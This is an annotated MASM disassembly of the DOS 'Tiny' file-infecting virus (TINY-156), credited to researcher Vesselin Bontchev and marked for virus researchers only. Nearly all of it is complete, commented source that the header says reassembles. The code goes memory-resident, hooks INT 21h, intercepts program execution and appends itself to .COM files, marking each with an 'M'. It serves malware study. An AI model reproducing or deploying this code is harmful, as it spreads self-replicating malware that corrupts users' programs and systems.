﻿

	page	,132
	name	TINY156
	title	The 'Tiny' virus, version TINY-156
	.radix	16

; ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»
; º  Bulgaria, 1404 Sofia, kv. "Emil Markov", bl. 26, vh. "W", et. 5, ap. 51 º
; º  Telephone: Private: +359-2-586261, Office: +359-2-71401 ext. 255	     º
; º									     º
; º			 The 'Tiny' Virus, version TINY-156                  º
; º		 Disassembled by Vesselin Bontchev, September 1990	     º
; º									     º
; º		     Copyright (c) Vesselin Bontchev 1989, 1990 	     º
; º									     º
; º	 This listing is only to be made available to virus researchers      º
; º		   or software writers on a need-to-know basis. 	     º
; ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼

; The disassembly has been tested by re-assembly using MASM 5.0.

code	segment
	assume	cs:code, ds:code

	org	100

seg_60	equ	600
v_len	equ	v_end-first4

start:
	jmp	v_entry 	; Jump to virus code
	db	'M'             ; Virus signature
	mov	ax,4C00 	; Program terminate
	int	21

; The original first 4 bytes of the infected file:

first4	db	0EBh, 2, 90, 90

v_entry:
	mov	si,0FF		; Determine the start addres of the virus body
	add	si,[si+2]

	mov	di,offset start ; Put the addres of program start on the stack
	push	di		; Now a Near RET instruction will jump there

	push	ax		; Save AX (to keep programs as DISKCOPY happy)

	movsw			; Restore the original first 4 bytes
	movsw

	mov	di,seg_60+4	; Point ES:DI at 0000:0604h (i.e, segment 60h)
	xor	cx,cx		; ES := 0
	mov	es,cx
	mov	cl,v_len-2	; CX := virus length
	lodsw			; Check if virus is present in memory
	scasw
	je	run		; Just run the program if so

; Virus not in memory. Install it there:

	dec	di		; Adjust DI
	dec	di
	stosw			; Store the first word of the virus body
	rep	movsb		; Store the rest of the virus

	mov	di,32*4 	; Old INT 21h handler will be moved to INT 32h
	mov	ax,int_21-first4+seg_60

; Move the INT 21h handler to INT 32h and
; install int_21 as new INT 21h handler:

	xchg	ax,cx
vect_cpy:
	xchg	ax,cx
	xchg	ax,word ptr es:[di-(32-21)*4]
	stosw
	jcxz	vect_cpy	; Loop until done

run:
	pop	ax		; Restore AX
	push	ds		; ES := DS
	pop	es

; Jump to program start via funny RET instruction:

	ret

int_21: 			; New INT 21h handler
	cmp	ax,4B00 	; EXEC function call?
	jne	end_21		; Exit if not

	push	ax		; Save registers used
	push	bx
	push	cx
	push	dx
	push	di
	push	ds
	push	es

	push	cs		; ES := CS
	pop	es

	mov	ax,3D02 	; Open the file for both reading and writting
	int	32
	jc	end_exec	; Exit on error
	xchg	ax,bx		; Save the file handle in BX

	mov	al,0
	call	lseek

	mov	ah,3F		; Read the first 4 bytes of the file
	mov	di,dx		; Save first4 address in DI
	push	cs		; DS := CS
	pop	ds
	int	32		; Do it

; Check whether the file is already infected or is an .EXE file.
; The former contains the character `M' in its 3rd byte and
; the latter contains it either in the 0th or in the 1st byte.

	push	di		; Save DI
	mov	al,'M'          ; Look for `M'
	repne	scasb
	pop	di		; Restore DI
	je	close		; Exit if file not suitable for infection

	mov	al,2		; Seek to the end of file
	call	lseek

	push	ax		; Save file length

	mov	cl,v_len	; Length of virus body
	mov	ah,40		; Append virus to file
	int	32		; Do it

	mov	al,0		; Seek to the file beginning
	call	lseek

	mov	al,0E9		; Near JMP opcode
	stosb			; Form the first instruction of the file
	pop	ax		; Restore file length in AX
	inc	ax
	stosw			; Form the JMP's opperand
	mov	al,'M'          ; Add a `M' character to mark the file
	stosb			;  as infected

	mov	ah,40
	int	32		; Do it

close:
	mov	ah,3E		; Close the file
	int	32

end_exec:
	pop	es		; Restore used registers
	pop	ds
	pop	di
	pop	dx
	pop	cx
	pop	bx
	pop	ax

; Exit through the original INT 21h handler:

end_21:
	jmp	dword ptr cs:[32*4]

lseek:
	mov	ah,42		; Lseek either to file beginning or to file end
	xor	cx,cx
	xor	dx,dx
	int	32		; Do it

	mov	dh,6		; Put 6 in DH and 4 in CL
	mov	cl,4
	ret			; Done

v_end	equ	$		; End of virus body

code	ends
	end	start

